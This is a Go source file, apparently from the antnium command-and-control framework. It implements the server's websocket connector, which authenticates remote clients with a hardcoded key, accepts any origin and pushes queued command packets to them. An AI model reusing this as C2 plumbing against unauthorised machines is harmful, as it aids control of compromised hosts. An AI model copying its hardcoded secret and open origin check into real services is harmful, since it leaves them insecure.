package server

import (
	"encoding/json"
	"net/http"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

type ConnectorWs struct {
	middleware *Middleware
	clients    map[string]*websocket.Conn // ComputerId:WebsocketConnection
	wsUpgrader websocket.Upgrader
	coder      model.Coder
	campaign   *campaign.Campaign
}

func MakeConnectorWs(campaign *campaign.Campaign, middleware *Middleware) ConnectorWs {
	a := ConnectorWs{
		middleware: middleware,
		clients:    make(map[string]*websocket.Conn),
		wsUpgrader: websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }},
		coder:      model.MakeCoder(campaign),
		campaign:   campaign,
	}
	return a
}

// wsHandler is the entry point for new websocket connections
func (a *ConnectorWs) wsHandlerClient(w http.ResponseWriter, r *http.Request) {
	ws, err := a.wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Errorf("ClientWebsocket: %s", err.Error())
		return
	}

	// WebSocket Authentication
	var authToken model.ClientWebSocketAuth
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Error("ClientWebsocket read error")
		return
	}
	err = json.Unmarshal(message, &authToken)
	if err != nil {
		log.Errorf("ClientWebsocket: could not decode auth: %v", message)
		return
	}
	if authToken.Key != "antnium" {
		log.Warn("ClientWebsocket: incorrect key: " + authToken.Key)
		return
	}

	a.registerWs(authToken.ComputerId, ws)
}

// wsHandler is the entry point for new websocket connections
func (a *ConnectorWs) registerWs(computerId string, ws *websocket.Conn) {
	if ws == nil {
		log.Error("registerWs with nil arg")
		return
	}
	// register client as auth succeeded
	a.clients[computerId] = ws

	// Thread which reads from the client connection
	// Lifetime: Websocket connection
	go func() {
		for {
			_, packetData, err := ws.ReadMessage()
			if err != nil {
				log.Infof("ws_client error: %s", err.Error())
				ws.Close()
				a.clients[computerId] = nil
				break
			}
			packet, err := a.coder.DecodeData(packetData)
			if err != nil {
				log.Infof("ws_client error: %s", err.Error())
				continue
			}

			a.middleware.ClientSendPacket(packet, ws.RemoteAddr().String())
		}
	}()

	// send all packets which havent yet been answered
	for {
		packet, ok := a.middleware.ClientGetPacket(computerId, "")
		if !ok {
			break
		}
		a.TryViaWebsocket(&packet)
	}

}

func (a *ConnectorWs) TryViaWebsocket(packet *model.Packet) bool {
	clientConn, ok := a.clients[packet.ComputerId]
	if !ok {
		// All ok, not connected to ws
		return false
	}
	if clientConn == nil {
		log.Warn("WS Client connection nil")
		return false
	}

	// Encode the packet and send it
	jsonData, err := a.coder.EncodeData(*packet)
	if err != nil {
		return false
	}

	err = clientConn.WriteMessage(websocket.TextMessage, jsonData)
	if err != nil {
		log.Infof("Websocket for host %s closed when trying to write: %s", packet.ComputerId, err.Error())
		return false
	}

	log.Infof("Client %s notified about new packet via WS", packet.ComputerId)

	return true
}
